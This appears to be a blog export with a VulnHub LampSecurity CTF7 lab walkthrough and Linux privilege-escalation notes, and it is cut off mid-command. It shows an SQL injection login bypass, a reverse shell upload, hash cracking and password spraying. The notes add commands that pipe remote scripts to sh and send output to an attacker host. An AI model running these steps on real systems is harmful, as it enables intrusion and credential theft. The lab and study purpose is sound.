[{"title":"[vulnhub]  LampSec-CTF7","url":"/2023/05/23/LampSec-CTF7/","content":"\n\n\n靶机部署这台机子将其网卡设置为eth0。实际上的网卡是eth1。因此，我们需要删除配置文件&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth0，并创建一个名为ifcfg-eth1的新文件。必须写在文件中的设置是ONBOOT=yes BOOTPROTO=dhcp DEVICE=eth1 #要配置的网卡名。然后service network restart就可以了。(在Cent OS 6中, 在大于等于7的版本应该使用systemctl)其实之后最好把靶机丢到vm里面选择已经移动别选复制，这样容易保障网络环境配置不出问题。\n信息收集┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ sudo nmap -sn 192.168.56.0/24[sudo] password for kali: Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 20:29 CSTNmap scan report for 192.168.56.1Host is up (0.0014s latency).MAC Address: 00:50:56:C0:00:08 (VMware)Nmap scan report for 192.168.56.2Host is up (0.0010s latency).MAC Address: 00:50:56:EC:CE:9E (VMware)Nmap scan report for 192.168.56.141Host is up (0.00089s latency).MAC Address: 00:0C:29:AC:12:E4 (VMware)Nmap scan report for 192.168.56.254Host is up (0.00060s latency).MAC Address: 00:50:56:E6:06:A3 (VMware)Nmap scan report for 192.168.56.132Host is up.Nmap done: 256 IP addresses (5 hosts up) scanned in 2.02 seconds\n\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ sudo nmap -p- --min-rate=10000 192.168.56.141Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 20:30 CSTNmap scan report for 192.168.56.141Host is up (0.0011s latency).Not shown: 65507 filtered tcp ports (no-response), 19 filtered tcp ports (host-prohibited)PORT      STATE  SERVICE22/tcp    open   ssh80/tcp    open   http137/tcp   closed netbios-ns138/tcp   closed netbios-dgm139/tcp   open   netbios-ssn901/tcp   open   samba-swat5900/tcp  closed vnc8080/tcp  open   http-proxy10000/tcp open   snet-sensor-mgmtMAC Address: 00:0C:29:AC:12:E4 (VMware)Nmap done: 1 IP address (1 host up) scanned in 13.48 seconds\n\n还开了挺多端口的，80，8080，139，10000都可以看看。\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ sudo nmap -sU -p- --min-rate=10000 192.168.56.141Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 20:39 CSTWarning: 192.168.56.141 giving up on port because retransmission cap hit (10).Nmap scan report for 192.168.56.141Host is up (0.0019s latency).All 65535 scanned ports on 192.168.56.141 are in ignored states.Not shown: 65457 open|filtered udp ports (no-response), 78 filtered udp ports (host-prohibited)MAC Address: 00:0C:29:AC:12:E4 (VMware)Nmap done: 1 IP address (1 host up) scanned in 72.81 seconds\n\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ sudo nmap -sT -sV -O -p22,80,137,138,139,901,5900,8080,10000 192.168.56.141Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 20:47 CSTNmap scan report for 192.168.56.141Host is up (0.00058s latency).PORT      STATE  SERVICE     VERSION22/tcp    open   ssh         OpenSSH 5.3 (protocol 2.0)80/tcp    open   http        Apache httpd 2.2.15 ((CentOS))137/tcp   closed netbios-ns138/tcp   closed netbios-dgm139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)901/tcp   open   http        Samba SWAT administration server5900/tcp  closed vnc8080/tcp  open   http        Apache httpd 2.2.15 ((CentOS))10000/tcp open   http        MiniServ 1.610 (Webmin httpd)MAC Address: 00:0C:29:AC:12:E4 (VMware)Device type: general purposeRunning: Linux 2.6.X|3.XOS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3OS details: Linux 2.6.32 - 3.13Network Distance: 1 hopOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 43.12 seconds\n\n趁其它还在扫描的时间先看看80端口吧。\nEXPLOITweb先目录发现一下，扫描的同时自己手动看看网页。\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ sudo dirb http://192.168.56.141                                                                                [sudo] password for kali: -----------------DIRB v2.22    By The Dark Raver-----------------START_TIME: Tue May  2 22:34:27 2023URL_BASE: http://192.168.56.141/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------\n\n随便点点，发现有几个可以输入注册的地方，以及8080端口是个登录页面。\nSQLi加点&#39;看看有何反应。OK，存在sql注入漏洞。之后看看是否用sqlmap把库dump出来看看。再在登录页面试试。\n# 192.168.56.141:8080admin&#x27;) or 1=1 #-- -\n\n竟然直接登进来了。\n文件上传ok，不过一时间看不出是什么cms，那就找找有无什么可以上传文件的地方呗。Fortunetly, we find the way to upload files.We try our PoC of upload vuln.Seems that the &lt;?and?&gt; are filtered. However, even if we try to bypass the filter like &lt;sript language=&quot;php&quot;&gt;payload&lt;/script&gt;, the payload just doesn’t work.As a result, we must find the path of the uploaded shell.Oh, don’t forget we did web content discovery and it was done for sure. So let us take a look at it.\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ sudo dirb http://192.168.56.141                                                                                [sudo] password for kali: -----------------DIRB v2.22    By The Dark Raver-----------------START_TIME: Tue May  2 22:34:27 2023URL_BASE: http://192.168.56.141/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612                                                          ---- Scanning URL: http://192.168.56.141/ ----+ http://192.168.56.141/about (CODE:200|SIZE:4910)                                                                          ==&gt; DIRECTORY: http://192.168.56.141/assets/                                                                                + http://192.168.56.141/backups (CODE:301|SIZE:333)                                                                         + http://192.168.56.141/cgi-bin/ (CODE:403|SIZE:290)                                                                        + http://192.168.56.141/contact (CODE:200|SIZE:5017)                                                                        ==&gt; DIRECTORY: http://192.168.56.141/css/                                                                                   + http://192.168.56.141/db (CODE:200|SIZE:3904)                                                                             + http://192.168.56.141/default (CODE:200|SIZE:6058)                                                                        + http://192.168.56.141/footer (CODE:200|SIZE:3904)                                                                         + http://192.168.56.141/header (CODE:200|SIZE:3904)                                                                         ==&gt; DIRECTORY: http://192.168.56.141/img/                                                                                   ==&gt; DIRECTORY: http://192.168.56.141/inc/                                                                                   + http://192.168.56.141/index.php (CODE:200|SIZE:6058)                                                                      ==&gt; DIRECTORY: http://192.168.56.141/js/                                                                                    + http://192.168.56.141/newsletter (CODE:200|SIZE:4037)                                                                     + http://192.168.56.141/phpinfo (CODE:200|SIZE:58762)                                                                       + http://192.168.56.141/profile (CODE:200|SIZE:3977)                                                                        + http://192.168.56.141/read (CODE:302|SIZE:1)                                                                              + http://192.168.56.141/recovery (CODE:200|SIZE:4807)                                                                       + http://192.168.56.141/register (CODE:200|SIZE:6591)                                                                       + http://192.168.56.141/signup (CODE:200|SIZE:4783)                                                                         + http://192.168.56.141/usage (CODE:403|SIZE:287)                                                                           ==&gt; DIRECTORY: http://192.168.56.141/webalizer/                                                                             ==&gt; DIRECTORY: http://192.168.56.141/webmail/                                                                                                                                                                                                           ---- Entering directory: http://192.168.56.141/assets/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it.                            (Use mode &#x27;-w&#x27; if you want to scan it anyway)                                                                                                                            ---- Entering directory: http://192.168.56.141/css/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it.                            (Use mode &#x27;-w&#x27; if you want to scan it anyway)                                                                                                                            ---- Entering directory: http://192.168.56.141/img/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it.                            (Use mode &#x27;-w&#x27; if you want to scan it anyway)                                                                                                                            ---- Entering directory: http://192.168.56.141/inc/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it.                            (Use mode &#x27;-w&#x27; if you want to scan it anyway)                                                                                                                            ---- Entering directory: http://192.168.56.141/js/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it.                            (Use mode &#x27;-w&#x27; if you want to scan it anyway)                                                                                                                            ---- Entering directory: http://192.168.56.141/webalizer/ ----+ http://192.168.56.141/webalizer/index.html (CODE:200|SIZE:3671)                                                                                                                                                                                       ---- Entering directory: http://192.168.56.141/webmail/ ----+ http://192.168.56.141/webmail/bin (CODE:403|SIZE:293)                                                                     + http://192.168.56.141/webmail/config (CODE:403|SIZE:296)                                                                  + http://192.168.56.141/webmail/favicon.ico (CODE:200|SIZE:1150)                                                            + http://192.168.56.141/webmail/index.php (CODE:200|SIZE:5157)                                                              ==&gt; DIRECTORY: http://192.168.56.141/webmail/installer/                                                                     + http://192.168.56.141/webmail/LICENSE (CODE:403|SIZE:297)                                                                 + http://192.168.56.141/webmail/logs (CODE:403|SIZE:294)                                                                    ==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/                                                                       ==&gt; DIRECTORY: http://192.168.56.141/webmail/program/                                                                       + http://192.168.56.141/webmail/README (CODE:403|SIZE:296)                                                                  + http://192.168.56.141/webmail/robots.txt (CODE:200|SIZE:26)                                                               ==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/                                                                         + http://192.168.56.141/webmail/SQL (CODE:403|SIZE:293)                                                                     + http://192.168.56.141/webmail/temp (CODE:403|SIZE:294)                                                                                                                                                                                                ---- Entering directory: http://192.168.56.141/webmail/installer/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/installer/images/                                                              + http://192.168.56.141/webmail/installer/index.php (CODE:302|SIZE:0)                                                                                                                                                                                   ---- Entering directory: http://192.168.56.141/webmail/plugins/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/archive/                                                               ==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/emoticons/                                                             ==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/help/                                                                  ==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/password/                                                              ==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/userinfo/                                                                                                                                                                                          ---- Entering directory: http://192.168.56.141/webmail/program/ ----(!) WARNING: All responses for this directory seem to be CODE = 403.                                                            (Use mode &#x27;-w&#x27; if you want to scan it anyway)                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/skins/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/                                                                                                                                                                                             ---- Entering directory: http://192.168.56.141/webmail/installer/images/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/plugins/archive/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/archive/skins/                                                                                                                                                                                     ---- Entering directory: http://192.168.56.141/webmail/plugins/emoticons/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/plugins/help/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/help/content/                                                          ==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/help/skins/                                                                                                                                                                                        ---- Entering directory: http://192.168.56.141/webmail/plugins/password/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/password/drivers/                                                      ==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/password/helpers/                                                      + http://192.168.56.141/webmail/plugins/password/README (CODE:200|SIZE:10645)                                                                                                                                                                           ---- Entering directory: http://192.168.56.141/webmail/plugins/userinfo/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/skins/classic/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/images/                                                          ==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/includes/                                                        + http://192.168.56.141/webmail/skins/classic/README (CODE:200|SIZE:855)                                                    ==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/templates/                                                                                                                                                                                   ---- Entering directory: http://192.168.56.141/webmail/plugins/archive/skins/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/archive/skins/classic/                                                                                                                                                                             ---- Entering directory: http://192.168.56.141/webmail/plugins/help/content/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/plugins/help/skins/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/help/skins/classic/                                                                                                                                                                                ---- Entering directory: http://192.168.56.141/webmail/plugins/password/drivers/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/plugins/password/helpers/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/skins/classic/images/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/images/buttons/                                                  ==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/images/display/                                                  + http://192.168.56.141/webmail/skins/classic/images/favicon.ico (CODE:200|SIZE:1150)                                       ==&gt; DIRECTORY: http://192.168.56.141/webmail/skins/classic/images/icons/                                                                                                                                                                                ---- Entering directory: http://192.168.56.141/webmail/skins/classic/includes/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/skins/classic/templates/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/plugins/archive/skins/classic/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/plugins/help/skins/classic/ ----==&gt; DIRECTORY: http://192.168.56.141/webmail/plugins/help/skins/classic/templates/                                                                                                                                                                      ---- Entering directory: http://192.168.56.141/webmail/skins/classic/images/buttons/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/skins/classic/images/display/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/skins/classic/images/icons/ ----                                                                                                                            ---- Entering directory: http://192.168.56.141/webmail/plugins/help/skins/classic/templates/ ----                                                                               /zt                                          -----------------END_TIME: Tue May  2 22:39:31 2023DOWNLOADED: 124624 - FOUND: 32\n\nAfter some munal try, we find out upload file in the path of 192.168.56.141/assets/.So we upload php-reverse-shell.And we curl our shell.php\n# curl http://192.168.56.141/assets/shell.php┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ sudo nc -lvp 443                                                           [sudo] password for kali: listening on [any] 443 ...192.168.56.141: inverse host lookup failed: Host name lookup failureconnect to [192.168.56.132] from (UNKNOWN) [192.168.56.141] 48031Linux localhost.localdomain 2.6.32-279.el6.i686 #1 SMP Fri Jun 22 10:59:55 UTC 2012 i686 i686 i386 GNU/Linux 17:37:14 up  2:45,  0 users,  load average: 0.00, 0.00, 0.00USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHATuid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0sh: no job control in this shellsh-4.1$ whoamiwhoamiapachesh-4.1$ pwd/pwdsh-4.1$ ip aip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue state UNKNOWN     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN qlen 1000    link/ether 00:0c:29:ac:12:e4 brd ff:ff:ff:ff:ff:ff    inet 192.168.56.141/24 brd 192.168.56.255 scope global eth1    inet6 fe80::20c:29ff:feac:12e4/64 scope link        valid_lft forever preferred_lft forever\n\nSucessfully get webshell.\nPrivilege Escalation先python spwan一个更稳定的shell。然后sudo -l需要密码，findsuid位文件没有能用的，cat /etc/crontab直接没有定时任务。OK。行吧，在上大招前先手工枚举一下吧。\nuname -a                                                                                     Linux localhost.localdomain 2.6.32-279.el6.i686 #1 SMP Fri Jun 22 10:59:55 UTC 2012 i686 i686 i386 GNU/Linux \n\n版本挺低的，还是经典2.6，可以考虑内核提权。但是优先级往后稍稍吧。\n配置文件查看cd到&#x2F;home目录下，发现很多用户，然而没有read权限，没用，查不了是否有用户遗留的登录凭证。那就看看网站配置文件啥的吧，找点前后端连接用到的密码。\nbash-4.1$ cat config.inc.phpcat config.inc.php&lt;?php/* * Generated configuration file * Generated by: phpMyAdmin 3.5.4 setup script * Date: Wed, 19 Dec 2012 09:01:38 -0500 *//* Servers configuration */$i = 0;/* Server: localhost [1] */$i++;$cfg[&#x27;Servers&#x27;][$i][&#x27;verbose&#x27;] = &#x27;localhost&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;host&#x27;] = &#x27;localhost&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;port&#x27;] = &#x27;&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;socket&#x27;] = &#x27;&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;connect_type&#x27;] = &#x27;tcp&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;extension&#x27;] = &#x27;mysqli&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;nopassword&#x27;] = true;$cfg[&#x27;Servers&#x27;][$i][&#x27;auth_type&#x27;] = &#x27;cookie&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;user&#x27;] = &#x27;root&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;password&#x27;] = &#x27;&#x27;;$cfg[&#x27;Servers&#x27;][$i][&#x27;AllowNoPassword&#x27;] = TRUE;$cfg[&#x27;Servers&#x27;][$i][&#x27;AllowNoPasswordRoot&#x27;] = TRUE; /* End of servers configuration */$cfg[&#x27;blowfish_secret&#x27;] = &#x27;50d1c8ba084fd9.39888691&#x27;;$cfg[&#x27;DefaultLang&#x27;] = &#x27;en&#x27;;$cfg[&#x27;ServerDefault&#x27;] = 1;$cfg[&#x27;UploadDir&#x27;] = &#x27;&#x27;;$cfg[&#x27;SaveDir&#x27;] = &#x27;&#x27;;\n\n从网站config文件我们可以看到，数据root用户登录直接不用密码。那我之后可以登录一下数据库找点信息。\n敏感信息泄露再手动遍历了下网页目录，发现之前进不去的&#x2F;backups目录有个备份文件。我们查看一下，刚好最后几行记录了向数据库插入用户的账号密码等信息。\n/* /var/www/html/backups */LOCK TABLES `users` WRITE;/*!40000 ALTER TABLE `users` DISABLE KEYS */;INSERT INTO `users` VALUES (&#x27;webdev@localhost.localdomain&#x27;,&#x27;f7aa6066f95255096672e3a5fc537081&#x27;,1,NULL,13,&#x27;Developer account&#x27;,&#x27;Developer account for updating the site.&#x27;),(&#x27;brian@localhost.localdomain&#x27;,&#x27;d41d8cd98f00b204e9800998ecf8427e&#x27;,1,&#x27;2012-12-19 11:30:54&#x27;,3,&#x27;Brian Hershel&#x27;,&#x27;Brian is our technical brains behind the operations and a chief trainer.&#x27;),(&#x27;john@localhost.localdomain&#x27;,&#x27;0d9ff2a4396d6939f80ffe09b1280ee1&#x27;,1,NULL,4,&#x27;John Durham&#x27;,&#x27;&#x27;),(&#x27;alice@localhost.localdomain&#x27;,&#x27;2146bf95e8929874fc63d54f50f1d2e3&#x27;,1,NULL,5,&#x27;Alice Wonder&#x27;,&#x27;&#x27;),(&#x27;ruby@localhost.localdomain&#x27;,&#x27;9f80ec37f8313728ef3e2f218c79aa23&#x27;,0,NULL,6,&#x27;Ruby Spinster&#x27;,&#x27;&#x27;),(&#x27;leon@localhost.localdomain&#x27;,&#x27;5d93ceb70e2bf5daa84ec3d0cd2c731a&#x27;,0,NULL,7,&#x27;Leon Parnetta&#x27;,&#x27;&#x27;),(&#x27;julia@localhost.localdomain&#x27;,&#x27;ed2539fe892d2c52c42a440354e8e3d5&#x27;,0,NULL,8,&#x27;Julia Fields&#x27;,&#x27;&#x27;),(&#x27;michael@localhost.localdomain&#x27;,&#x27;9c42a1346e333a770904b2a2b37fa7d3&#x27;,0,NULL,9,&#x27;Michael Saint&#x27;,&#x27;&#x27;),(&#x27;bruce@localhost.localdomain&#x27;,&#x27;3a24d81c2b9d0d9aaf2f10c6c9757d4e&#x27;,0,NULL,10,&#x27;Bruce Pottricks&#x27;,&#x27;&#x27;),(&#x27;neil@localhost.localdomain&#x27;,&#x27;4773408d5358875b3764db552a29ca61&#x27;,0,NULL,11,&#x27;Neil Felstein&#x27;,&#x27;&#x27;),(&#x27;charles@localhost.localdomain&#x27;,&#x27;b2a97bcecbd9336b98d59d9324dae5cf&#x27;,0,NULL,12,&#x27;Charles Adams&#x27;,&#x27;&#x27;);/*!40000 ALTER TABLE `users` ENABLE KEYS */;\n\n我们提取一下登录凭证，把哈希值丢到crackstation。然后用得到的密码尝试直接ssh看看能不能成功登录。\nbrain:&#x27;&#x27;#竟然是md5的空值，草。webdev:&#x27;webdev&#x27;john:&#x27;transformersrule&#x27;\n\n试到第3个john的时候就成功了。\nbash-4.1$ su johnsu johnPassword: transformersrule[john@localhost backups]$ whoamiwhoamijohn[john@localhost backups]$ sudo -lsudo -l[sudo] password for john: transformersruleMatching Defaults entries for john on this host:    requiretty, !visiblepw, always_set_home, env_reset, env_keep=&quot;COLORS    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&quot;, env_keep+=&quot;MAIL PS1    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;, env_keep+=&quot;LC_COLLATE    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;, env_keep+=&quot;LC_MONETARY    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;, env_keep+=&quot;LC_TIME LC_ALL    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;,    secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/binUser john may run the following commands on this host:    (ALL) ALL[john@localhost backups]$ sudo susudo su[root@localhost backups]# whoamiwhoamiroot[root@localhost backups]# ip aip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue state UNKNOWN     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN qlen 1000    link/ether 00:0c:29:ac:12:e4 brd ff:ff:ff:ff:ff:ff    inet 192.168.56.141/24 brd 192.168.56.255 scope global eth1    inet6 fe80::20c:29ff:feac:12e4/64 scope link        valid_lft forever preferred_lft forever\n\n直接是sudo用户组的，直接提权成功。\n密码复用当然，我们也可以登录mysql数据库查看用户与密码。\n#mysql -uroot#show databases;#use users;#select * from users;mysql&gt; select username,password from users;select username,password from users;+-------------------------------+----------------------------------+| username                      | password                         |+-------------------------------+----------------------------------+| brian@localhost.localdomain   | e22f07b17f98e0d9d364584ced0e3c18 || john@localhost.localdomain    | 0d9ff2a4396d6939f80ffe09b1280ee1 || alice@localhost.localdomain   | 2146bf95e8929874fc63d54f50f1d2e3 || ruby@localhost.localdomain    | 9f80ec37f8313728ef3e2f218c79aa23 || leon@localhost.localdomain    | 5d93ceb70e2bf5daa84ec3d0cd2c731a || julia@localhost.localdomain   | ed2539fe892d2c52c42a440354e8e3d5 || michael@localhost.localdomain | 9c42a1346e333a770904b2a2b37fa7d3 || bruce@localhost.localdomain   | 3a24d81c2b9d0d9aaf2f10c6c9757d4e || neil@localhost.localdomain    | 4773408d5358875b3764db552a29ca61 || charles@localhost.localdomain | b2a97bcecbd9336b98d59d9324dae5cf || foo@bar.com                   | 4cb9c8a8048fd02294477fcb1a41191a || 1@1.com                       | c4ca4238a0b923820dcc509a6f75849b || test@nowhere.com              | 098f6bcd4621d373cade4e832627b4f6 |+-------------------------------+----------------------------------+13 rows in set (0.00 sec)\n\n将这些凭证用sed与awk处理后，将hash值直接丢到hashcat中破解。\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ hashcat -a 0 -m 0 passhash /usr/share/wordlists/rockyou.txt hashcat (v6.2.6) startingOpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]==================================================================================================================================================* Device #1: pthread-sandybridge-Intel(R) Core(TM) i7-6700 CPU @ 3.40GHz, 2913/5890 MB (1024 MB allocatable), 8MCUMinimum password length supported by kernel: 0Maximum password length supported by kernel: 256Hashes: 12 digests; 12 unique digests, 1 unique saltsBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotatesRules: 1Optimizers applied:* Zero-Byte* Early-Skip* Not-Salted* Not-Iterated* Single-Salt* Raw-HashATTENTION! Pure (unoptimized) backend kernels selected.Pure kernels can crack longer passwords, but drastically reduce performance.If you want to switch to optimized kernels, append -O to your commandline.See the above message to find out about the exact limits.Watchdog: Temperature abort trigger set to 90cHost memory required for this attack: 2 MBDictionary cache built:* Filename..: /usr/share/wordlists/rockyou.txt* Passwords.: 14344392* Bytes.....: 139921507* Keyspace..: 14344385* Runtime...: 4 secsed2539fe892d2c52c42a440354e8e3d5:madrid                   4cb9c8a8048fd02294477fcb1a41191a:changeme                 5d93ceb70e2bf5daa84ec3d0cd2c731a:qwer1234                 098f6bcd4621d373cade4e832627b4f6:test                     b2a97bcecbd9336b98d59d9324dae5cf:chuck33                  2146bf95e8929874fc63d54f50f1d2e3:turtles77                9c42a1346e333a770904b2a2b37fa7d3:somepassword             e22f07b17f98e0d9d364584ced0e3c18:my2cents                 Cracking performance lower than expected?                 * Append -O to the commandline.  This lowers the maximum supported password/salt length (usually down to 32).* Append -w 3 to the commandline.  This can cause your screen to lag.* Append -S to the commandline.  This has a drastic speed impact but can be better for specific attacks.  Typical scenarios are a small wordlist but a large ruleset.* Update your backend API runtime / driver the right way:  https://hashcat.net/faq/wrongdriver* Create more work items to make use of your parallelization power:  https://hashcat.net/faq/moreworkApproaching final keyspace - workload adjusted.                                                                     Session..........: hashcatStatus...........: ExhaustedHash.Mode........: 0 (MD5)Hash.Target......: passhashTime.Started.....: Wed May  3 14:34:10 2023 (6 secs)Time.Estimated...: Wed May  3 14:34:16 2023 (0 secs)Kernel.Feature...: Pure KernelGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........:  2728.7 kH/s (0.22ms) @ Accel:512 Loops:1 Thr:1 Vec:8Recovered........: 8/12 (66.67%) Digests (total), 8/12 (66.67%) Digests (new)Progress.........: 14344385/14344385 (100.00%)Rejected.........: 0/14344385 (0.00%)Restore.Point....: 14344385/14344385 (100.00%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidate.Engine.: Device GeneratorCandidates.#1....: $HEX[206b72697374656e616e6e65] -&gt; $HEX[042a0337c2a156616d6f732103]Hardware.Mon.#1..: Util: 28%Started: Wed May  3 14:33:41 2023Stopped: Wed May  3 14:34:17 2023\n\n我们用这些凭证进行密码喷洒攻击。\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf7/workSpace]└─$ sudo crackmapexec ssh 192.168.56.141 -u username -p pass --continue-on-success | grep +SSH         192.168.56.141  22     192.168.56.141   [+] brian:my2cents SSH         192.168.56.141  22     192.168.56.141   [+] alice:turtles77 SSH         192.168.56.141  22     192.168.56.141   [+] leon:qwer1234 SSH         192.168.56.141  22     192.168.56.141   [+] julia:madrid SSH         192.168.56.141  22     192.168.56.141   [+] michael:somepassword SSH         192.168.56.141  22     192.168.56.141   [+] charles:chuck33\n\n非常OK。\n","categories":["vulnhub"],"tags":["walkthrough"]},{"title":"Privilege Escalation","url":"/2023/05/23/pe_note/","content":"\n\n\nPrivilege Escalation整理自B站up红队笔记的提权精讲\nLinux Priv Esca最常用：\n\nugo\nsuid sgid\nCapabilities\nAppArmor Selinux\nACL\n\n用的也比较多的：\n\nGrsecurity\n\nPax\n\nExecShield\n\nASLR\n\nTOMOYO Linux\n\nSMACK\n\nYama\n\nCGroups\n\nLinux Namespaces\n\nStackGuard\n\nProplice\n\nseccomp\n\nPtrace\n\ncapsicum\n\nMprotect\n\nchroot\n\nfirejail\n\n\n手动枚举用户信息：\n\nwhoami\nid\nw&#x2F;who 查看其他登录用户\nlast 最近登录用户以及一些操作\n\n内核版本信息：\n\nuname -a\nlsb_release -a 更多信息\ncat &#x2F;proc&#x2F;version 进程信息查看版本\ncat &#x2F;etc&#x2F;issue\nhostnamectl\n\n网络信息：\n\nip a\nifconfig 老机子\nip route 查看路由表信息\nip neigh 查看网络邻居\narp -a\n\n用户权限：\n\nsudo -l\ngetcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null\nhistory 查看历史命令\ncat &#x2F;etc&#x2F;passwd\ncat cat &#x2F;etc&#x2F;shadow\ncat &#x2F;etc&#x2F;crontab\necho $PATH\nenv 查看整体环境\nps -ef  entire full list\nps axjf  x-没有连接到终端的进程 j-查看进程树 a-all\nps aux u-显示启动进程的用户\ntop 查看实时更新的进程信息 top -n 1 只刷一次\nnetstat -a \nnetstat -l 显示正在监听的\nfind &#x2F; -type f -perm -04000 2&gt;&#x2F;dev&#x2F;null  或者（find &#x2F; -type f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null）\nwhich 查询可执行文件\ncat &#x2F;etc&#x2F;fstab 查看未挂载磁盘（系统运维备份常临时挂载一块磁盘，当使用时再挂载，不使用时就卸掉）\n\n自动枚举\n大招：linpeas \n\n推荐：curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh  通过管道符执行，不保留文件到本地。\n将扫描结果传回本地查看 curl &lt;serverIP&gt;/linpeas.sh | sh | nc &lt;kaliIP&gt; &lt;port&gt;  kali: nc -lvnp &lt;port&gt; | tee name.txt tee 既又在标准输出中显示，又保存到txt文件中。txt文件可以用less -r 查看。\n靶机没有curl。kali：sudo nc -lvnp &lt;port&gt; &lt; linpeas.sh victim:cat &lt; /dev/tcp/&lt;kaliIP&gt;/&lt;port&gt; | sh \n\n\nlinEnum\n\nLSE\n\nLES\n\nlinuxprivchecker.py\n\nunix-privsec-check\n\n\nTrickshell的稳定python -c &quot;import pty; 